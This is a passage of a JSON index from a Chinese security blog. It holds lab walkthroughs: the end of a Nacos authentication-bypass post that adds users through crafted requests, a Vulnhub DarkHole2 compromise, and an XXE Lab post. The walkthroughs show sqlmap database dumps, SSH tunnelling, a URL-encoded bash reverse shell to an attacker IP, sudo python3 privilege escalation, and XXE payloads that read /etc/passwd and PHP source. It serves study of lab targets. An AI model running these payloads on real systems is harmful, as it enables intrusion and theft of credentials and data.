159\n\n&#123;\"totalCount\":1,\"pageNumber\":1,\"pagesAvailable\":1,\"pageItems\":[&#123;\"username\":\"nacos\",\"password\":\"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu\"&#125;]&#125;构造请求（查看 /auth/users 允许哪些请求方法）：OPTIONS /nacos/v1/auth/users?pageNo=1&amp;pageSize=9 HTTP/1.1\nHost: 192.168.81.132:8848\nUser-Agent: Nacos-Server\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\naccessToken: \nDNT: 1\nConnection: close\nReferer: http://192.168.81.132:8848/nacos/响应系统 /auth/users 允许使用POST方法：HTTP/1.1 200 \nAllow: POST,DELETE,GET,HEAD,PUT,OPTIONS\nContent-Length: 0\nDate: Mon, 16 May 2022 07:36:00 GMT\nConnection: close构造请求（往 /auth/users 中新增用户test）：POST /nacos/v1/auth/users?username=test&amp;password=test HTTP/1.1\nHost: 192.168.81.132:8848\nUser-Agent: Nacos-Server\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\naccessToken: \nDNT: 1\nConnection: close\nReferer: http://192.168.81.132:8848/nacos/再次构造请求，读取 /auth/users 内容，查看响应：HTTP/1.1 200 \nContent-Type: application/json;charset=UTF-8\nDate: Mon, 16 May 2022 07:38:44 GMT\nConnection: close\nContent-Length: 253\n\n&#123;\"totalCount\":2,\"pageNumber\":1,\"pagesAvailable\":1,\"pageItems\":[&#123;\"username\":\"nacos\",\"password\":\"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu\"&#125;,&#123;\"username\":\"test\",\"password\":\"$2a$10$9I9TiaATBCXNYSijYN5a9.d7yPyCa03BO2FcA9yBXoXyod6i4VN4S\"&#125;]&#125;\n\n","categories":["渗透测试"],"tags":["Vulhub","Nacos"]},{"title":"Vulnhub|DarkHole2","url":"/d0179d0c.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n┌──(root㉿kali)-[~]\n└─# nmap -A -p- 192.168.81.131\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 00:50 CDT\nNmap scan report for 192.168.81.131\nHost is up (0.00037s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)\n|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)\n|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: DarkHole V2\n| http-git: \n|   192.168.81.131:80/.git/\n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file 'description' to name the...\n|_    Last commit message: i changed login.php file for more secure \n|_http-server-header: Apache/2.4.41 (Ubuntu)\nMAC Address: 00:0C:29:9A:BA:9C (VMware)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel               \n启动了ssh和http，访问192.168.81.131:80/.git/是一个git目录。  \n\n2.代码审计\n直接访问80端口，是一个登陆界面，找不到有效的用户名与密码。把git代码拉下来：┌──(root㉿kali)-[~/Tools/test]\n└─# wget -r http://192.168.81.131/.git/查看config.php文件，找到连接mysql数据库darkhole_2的用户名root，口令为空：┌──(root㉿kali)-[~/Tools/test/192.168.81.131/config]\n└─# cat config.php \n&lt;?php\n$connect = new mysqli(\"localhost\",\"root\",\"\",\"darkhole_2\");     查看index.php文件，找到关键部分，存在URL /dashboard.php?id= 。┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# cat index.php\n......\n&lt;?php if(isset($_SESSION['userid']))&#123; \n ?>\n &lt;li>&lt;a href=\"logout.php\">logout&lt;/a>&lt;/li>\n &lt;li>&lt;a href=\"dashboard.php?id=&lt;?php echo $_SESSION['userid']; ?>\">Dashboard&lt;/a> &lt;/li>\n &lt;?php\n&#125;else&#123;\n ?>\n &lt;li>&lt;a href=\"login.php\">Login&lt;/a>&lt;/li>\n &lt;?php\n&#125; ?>\n......  查看login.php文件，找到关键部分，登录校验用户email、password和id=1，这里写死了id=1，应该是只允许一个用户登陆80的意思(?)。┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# cat login.php    \n&lt;?php\nsession_start();\nrequire 'config/config.php';\nif($_SERVER['REQUEST_METHOD'] == 'POST')&#123;\n   $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));\n   $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));\n   $check = $connect->query(\"select * from users where email='$email' and password='$pass' and id=1\");\n   if($check->num_rows)&#123;\n       $_SESSION['userid'] = 1;\n       header(\"location:dashboard.php\");\n       die();\n   &#125;\n\n&#125;\n?>\n......将从index.php获得的/dashboard.php?id=与login.php获得的id=1结合，直接访问，响应Not Allowed：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# curl http://192.168.81.131/dashboard.php?id=1\nNot Allowed                                                                                                                                                        想了一下git的特性，每一次合并分支都会有记录，故查看更新记录。┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# git log\ncommit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)\nAuthor: Jehad Alqurashi &lt;anmar-v7@hotmail.com>\nDate:   Mon Aug 30 13:14:32 2021 +0300\n\n   i changed login.php file for more secure\n\ncommit a4d900a8d85e8938d3601f3cef113ee293028e10\nAuthor: Jehad Alqurashi &lt;anmar-v7@hotmail.com>\nDate:   Mon Aug 30 13:06:20 2021 +0300\n\n   I added login.php file with default credentials\n\ncommit aa2a5f3aa15bb402f2b90a07d86af57436d64917\nAuthor: Jehad Alqurashi &lt;anmar-v7@hotmail.com>\nDate:   Mon Aug 30 13:02:44 2021 +0300\n\n   First Initialize注意到a4d900，作者在login.php携带了认证信息，想办法回退到a4d900版本，并查看login.php。┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# git reset --hard a4d900\nHEAD is now at a4d900a I added login.php file with default credentials\n\n┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# cat login.php    \n&lt;?php\nsession_start();\nrequire 'config/config.php';\nif($_SERVER['REQUEST_METHOD'] == 'POST')&#123;\n   if($_POST['email'] == \"lush@admin.com\" &amp;&amp; $_POST['password'] == \"321\")&#123;\n       $_SESSION['userid'] = 1;\n       header(\"location:dashboard.php\");\n       die();\n   &#125;\n\n&#125;\n?>\n......                                                                                                                                              找到账号密码 **lush@admin.com:321**。\n\n3.getshell\n用得到的账号密码登陆22，登不上去。用得到的账号密码登陆80，得到URL http://192.168.81.131/dashboard.php?id=1 是一个用户属性页面。把URL和Cookie丢到sqlmap里跑一下：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 --dbs --batch\n[02:26:14] [INFO] fetching database names\navailable databases [5]:\n[*] darkhole_2\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys在2.代码审计中的config.php就已经知道了我们使用的数据库是darkhole_2，继续爆表：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 --tables --batch \n[02:28:18] [INFO] fetching tables for database: 'darkhole_2'\nDatabase: darkhole_2\n[2 tables]\n+-------+\n| ssh   |\n| users |\n+-------+查看表ssh中的字段及内容：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh --columns --batch\n[02:29:38] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'\nDatabase: darkhole_2\nTable: ssh\n[3 columns]\n+--------+--------------+\n| Column | Type         |\n+--------+--------------+\n| user   | varchar(100) |\n| id     | int          |\n| pass   | varchar(100) |\n+--------+--------------+\n┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh -C user,id,pass --dump --batch\n[02:30:36] [INFO] fetching entries of column(s) '`user`,id,pass' for table 'ssh' in database 'darkhole_2'\nDatabase: darkhole_2\nTable: ssh\n[2 entries]\n+--------+----+------+\n| user   | id | pass |\n+--------+----+------+\n| jehad  | 1  | fool |\n+--------+----+------+查看表users中的字段及内容：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users --columns --batch\n[02:32:20] [INFO] fetching columns for table 'users' in database 'darkhole_2'\nDatabase: darkhole_2\nTable: users\n[6 columns]\n+----------------+--------------+\n| Column         | Type         |\n+----------------+--------------+\n| address        | varchar(100) |\n| contact_number | int          |\n| email          | varchar(100) |\n| id             | int          |\n| password       | varchar(200) |\n| username       | varchar(100) |\n+----------------+--------------+\n┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users -C address,contact_number,email,id,password,username --dump --batch\n[02:33:53] [INFO] fetching entries of column(s) 'address,contact_number,email,id,password,username' for table 'users' in database 'darkhole_2'\nDatabase: darkhole_2\nTable: users\n[1 entry]\n+-------------------------------------------+----------------+----------------+----+----------+-----------------------------+\n| address                                   | contact_number | email          | id | password | username                    |\n+-------------------------------------------+----------------+----------------+----+----------+-----------------------------+\n|  Street, Pincode, Province/State, Country | 1              | lush@admin.com | 1  | 321      | Jehad Alqurashiasddasdasdas |\n+-------------------------------------------+----------------+----------------+----+----------+-----------------------------+结合从80登陆查看的用户属性，可以知道80是向users表读取信息，users表中只有一个用户（id=1）。使用ssh表中得到的用户名密码jehad:fool登陆靶机的22：┌──(root㉿kali)-[~/Tools/test/192.168.81.131]\n└─# ssh 'jehad'@'192.168.81.131'    \n\njehad@darkhole:~$ pwd\n/home/jehad\njehad@darkhole:~$ id\nuid=1001(jehad) gid=1001(jehad) groups=1001(jehad)\njehad@darkhole:~$ ls -a\n.  ..  .bash_history  .bash_logout  .bashrc  .cache  .local  .mysql_history  .profile  .ssh  .viminfo查看jehad的.bash_history文件，得到mysql连接的用户名与密码root:Qrc123。jehad@darkhole:~$ cat .bash_history \n mysql -u root -p Qrc123查看/home目录中有三个用户，分别是jehad、lama和losy，进入到另外两个用户的目录下，收集可用信息，找到一个flag。jehad@darkhole:/home$ ls -a\n.  ..  jehad  lama  losy\n\njehad@darkhole:/home/losy$ cat user.txt\nDarkHole&#123;'This_is_the_life_man_better_than_a_cruise'&#125;\n\n4.提权\n尝试过 sudo、suid、编辑/etc/passwd和利用root登陆数据库darkhole_2往表ssh直接写入数据 都无法提权。故选择查看定时任务cat /etc/crontab。jehad@darkhole:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n* * * * * root service apache2 start &amp;&amp; service mysql start\n* * * * * losy  cd /opt/web &amp;&amp; php -S localhost:9999\n\n#可以看到losy定时在目录/opt/web下执行任务，监听本地端口9999。进到/opt/web下，看一下php文件：通过GET，传输参数cmd，执行系统命令。jehad@darkhole:/opt/web$ cat index.php \n&lt;?php\necho \"Parameter GET['cmd']\";\nif(isset($_GET['cmd']))&#123;\necho system($_GET['cmd']);\n&#125;\n?>直接访问http://192.168.81.131:9999/，访问不了。进行端口转发，对本机7777端口的访问映射到靶机的9999端口上(注意:是在攻击机上进行)：┌──(root㉿kali)-[~]\n└─# ssh -N -f -L 7777:127.0.0.1:9999 jehad@192.168.81.131\njehad@192.168.81.131's password: \n┌──(root㉿kali)-[~]\n└─# netstat -tulpn                                       \nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      30998/ssh           \ntcp6       0      0 ::1:7777                :::*                    LISTEN      30998/ssh           \nudp        0      0 0.0.0.0:68              0.0.0.0:*                           3513/dhclient       访问攻击机7777端口，并传入参数cmd：┌──(root㉿kali)-[~]\n└─# curl http://localhost:7777         \nParameter GET['cmd']                                                                                                                                                        \n┌──(root㉿kali)-[~]\n└─# curl http://localhost:7777/?cmd=id\nParameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)\nuid=1002(losy) gid=1002(losy) groups=1002(losy)                                                                                                                                                        可以通过losy执行系统命令，想办法反弹shell。本地监听6666端口，将反弹shell代码 bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.81.130/6666 0&gt;&amp;1&#39; 作为参数传入(注意：此处参数需要进行URL编码)：┌──(root㉿kali)-[~]\n└─# nc -lnvp 6666                                        \nlistening on [any] 6666 ...\n\n┌──(root㉿kali)-[~]\n└─# curl http://localhost:7777/?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%31%2e%31%33%30%2f%36%36%36%36%20%30%3e%26%31%27\n\n┌──(root㉿kali)-[~]\n└─# nc -lnvp 6666                                        \nlistening on [any] 6666 ...\nconnect to [192.168.81.130] from (UNKNOWN) [192.168.81.131] 42016\nbash: cannot set terminal process group (1246): Inappropriate ioctl for device\nbash: no job control in this shell\nlosy@darkhole:/opt/web$ 成功拿到losy的shell，看了一下还是得提到root，发现sudo不了，只拿到了shell外壳，没有校验口令：losy@darkhole:/home$ sudo -l\nsudo -l\nsudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper去看看losy的.bash_history，找到losy的密码gang：losy@darkhole:~$ cat .bash_history\nP0assw0rd losy:gang再到jehad那边切换到losy，再sudo -l：losy@darkhole:~$ sudo -l\n[sudo] password for losy: \nMatching Defaults entries for losy on darkhole:\n   env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser losy may run the following commands on darkhole:\n   (root) /usr/bin/python3！！！python是世界上最美的语言 提权，扫荡一下，找到第二个flag：losy@darkhole:~$ sudo python3 -c 'import os;os.system(\"/bin/bash\")'      \nroot@darkhole:~# cat root.txt\nDarkHole&#123;'Legend'&#125;\n\n","categories":["渗透测试"],"tags":["Vulnhub","内网穿透","Git","SSH端口转发","代码审计","SQL注入"]},{"title":"Vulnhub|XXE Lab","url":"/55575d9b.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n┌──(root㉿kali)-[&#x2F;var&#x2F;logs]\n└─# nmap -A -p- 192.168.81.129        \nStarting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-19 21:07 CDT\nNmap scan report for 192.168.81.129\nHost is up (0.00052s latency).                                                                                    \nNot shown: 65533 closed tcp ports (reset)                                                                         \nPORT     STATE SERVICE VERSION                                                                                    \n80&#x2F;tcp   open  http    Apache httpd 2.4.27 ((Ubuntu))                                                             \n| http-robots.txt: 2 disallowed entries                                                                           \n|_&#x2F;xxe&#x2F;* &#x2F;admin.php                                                                                               \n|_http-title: Apache2 Ubuntu Default Page: It works                                                               \n|_http-server-header: Apache&#x2F;2.4.27 (Ubuntu)                                                                      \n5355&#x2F;tcp open  llmnr?                                                                                             \nMAC Address: 00:0C:29:55:D1:56 (VMware)                                                                           \nDevice type: general purpose                                                                                      \nRunning: Linux 3.X|4.X                                                                                            \nOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4                                                   \nOS details: Linux 3.2 - 4.9                                                                                       \nNetwork Distance: 1 hop                 \nrobots.txt记录了两个路径：/xxe/和/admin.php。  \n\n2.测试\n访问/xxe/admin.php，返回一个登陆界面，尝试admin:admin登录，查看请求，没有什么可利用的地方。访问/xxe/，是一个登陆界面，尝试admin:admin登录，查看请求，POST报文是XML代码：POST /xxe/xxe.php HTTP/1.1\nHost: 192.168.81.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 95\nOrigin: http://192.168.81.129\nDNT: 1\nConnection: close\nReferer: http://192.168.81.129/xxe/\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>&lt;root>&lt;name>admin&lt;/name>&lt;password>admin&lt;/password>&lt;/root>尝试进行XXE，注意此处请求报文标记中参数前要加上一个&amp;：POST /xxe/xxe.php HTTP/1.1\nHost: 192.168.81.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 189\nOrigin: http://192.168.81.129\nDNT: 1\nConnection: close\nReferer: http://192.168.81.129/xxe/\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY>\n\n&lt;!ENTITY admin SYSTEM \"file:///etc/passwd\">\n\n]>\n&lt;root>&lt;name>&amp;admin;&lt;/name>&lt;password>admin&lt;/password>&lt;/root>查看响应体，注入成功：Sorry, this root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\nmessagebus:x:105:109::/var/run/dbus:/bin/false\n_apt:x:106:65534::/nonexistent:/bin/false\nuuidd:x:107:111::/run/uuidd:/bin/false\nr00t:x:1000:1000:Administrator,,,:/home/r00t:/bin/bash\nnot available!尝试读取/admin.php的内容：&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY>\n\n&lt;!ENTITY admin SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\">\n\n]>\n&lt;root>&lt;name>&amp;admin;&lt;/name>&lt;password>admin&lt;/password>&lt;/root>查看响应报文，得到base64形式的php内容，进行解码：//实际报文：\nSorry, this PD9waHAKICAgc2Vzc2lvbl9zdGFydCgpOwo/PgoKCjxodG1sIGxhbmcgPSAiZW4iPgogICAKICAgPGhlYWQ+CiAgICAgIDx0aXRsZT5hZG1pbjwvdGl0bGU+CiAgICAgIDxsaW5rIGhyZWYgPSAiY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWwgPSAic3R5bGVzaGVldCI+CiAgICAgIAogICAgICA8c3R5bGU+CiAgICAgICAgIGJvZHkgewogICAgICAgICAgICBwYWRkaW5nLXRvcDogNDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNBREFCQUI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiB7CiAgICAgICAgICAgIG1heC13aWR0aDogMzMwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5mb3JtLXNpZ25pbi1oZWFkaW5nLAogICAgICAgICAuZm9ybS1zaWduaW4gLmNoZWNrYm94IHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5jaGVja2JveCB7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sIHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sOmZvY3VzIHsKICAgICAgICAgICAgei1pbmRleDogMjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIGlucHV0W3R5cGU9ImVtYWlsIl0gewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAtMXB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiMwMTc1NzI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjojMDE3NTcyOwogICAgICAgICB9CiAgICAgICAgIAogICAgICAgICBoMnsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICA8L3N0eWxlPgogICAgICAKICAgPC9oZWFkPgoJCiAgIDxib2R5PgogICAgICAKICAgICAgPGgyPkVudGVyIFVzZXJuYW1lIGFuZCBQYXNzd29yZDwvaDI+IAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciBmb3JtLXNpZ25pbiI+CiAgICAgICAgIAogICAgICAgICA8P3BocAogICAgICAgICAgICAkbXNnID0gJyc7CiAgICAgICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2xvZ2luJ10pICYmICFlbXB0eSgkX1BPU1RbJ3VzZXJuYW1lJ10pIAogICAgICAgICAgICAgICAmJiAhZW1wdHkoJF9QT1NUWydwYXNzd29yZCddKSkgewoJCQkJCiAgICAgICAgICAgICAgIGlmICgkX1BPU1RbJ3VzZXJuYW1lJ10gPT0gJ2FkbWluaXN0aGViZXN0JyAmJiAKICAgICAgICAgICAgICAgICAgbWQ1KCRfUE9TVFsncGFzc3dvcmQnXSkgPT0gJ2U2ZTA2MTgzODg1NmJmNDdlMWRlNzMwNzE5ZmIyNjA5JykgewogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3ZhbGlkJ10gPSB0cnVlOwogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3RpbWVvdXQnXSA9IHRpbWUoKTsKICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddID0gJ2FkbWluaXN0aGViZXN0JzsKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlY2hvICJZb3UgaGF2ZSBlbnRlcmVkIHZhbGlkIHVzZSBuYW1lIGFuZCBwYXNzd29yZCA8YnIgLz4iOwoJCSRmbGFnID0gIkhlcmUgaXMgdGhlIDxhIHN0eWxlPSdjb2xvcjpGRjAwMDA7JyBocmVmPScvZmxhZ21lb3V0LnBocCc+RmxhZzwvYT4iOwoJCWVjaG8gJGZsYWc7CiAgICAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgICAgJG1zZyA9ICdNYXliZSBMYXRlcic7CiAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICA/PgogICAgICA8L2Rpdj4gPCEtLSBXMDB0L1cwMHQgLS0+CiAgICAgIAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciI+CiAgICAgIAogICAgICAgICA8Zm9ybSBjbGFzcyA9ICJmb3JtLXNpZ25pbiIgcm9sZSA9ICJmb3JtIiAKICAgICAgICAgICAgYWN0aW9uID0gIjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7IAogICAgICAgICAgICA/PiIgbWV0aG9kID0gInBvc3QiPgogICAgICAgICAgICA8aDQgY2xhc3MgPSAiZm9ybS1zaWduaW4taGVhZGluZyI+PD9waHAgZWNobyAkbXNnOyA/PjwvaDQ+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlID0gInRleHQiIGNsYXNzID0gImZvcm0tY29udHJvbCIgCiAgICAgICAgICAgICAgIG5hbWUgPSAidXNlcm5hbWUiIAogICAgICAgICAgICAgICByZXF1aXJlZCBhdXRvZm9jdXM+PC9icj4KICAgICAgICAgICAgPGlucHV0IHR5cGUgPSAicGFzc3dvcmQiIGNsYXNzID0gImZvcm0tY29udHJvbCIKICAgICAgICAgICAgICAgbmFtZSA9ICJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3MgPSAiYnRuIGJ0bi1sZyBidG4tcHJpbWFyeSBidG4tYmxvY2siIHR5cGUgPSAic3VibWl0IiAKICAgICAgICAgICAgICAgbmFtZSA9ICJsb2dpbiI+TG9naW48L2J1dHRvbj4KICAgICAgICAgPC9mb3JtPgoJCQkKICAgICAgICAgQ2xpY2sgaGVyZSB0byBjbGVhbiA8YSBocmVmID0gImFkbWlubG9nLnBocCIgdGl0ZSA9ICJMb2dvdXQiPlNlc3Npb24uCiAgICAgICAgIAogICAgICA8L2Rpdj4gCiAgICAgIAogICA8L2JvZHk+CjwvaHRtbD4K not 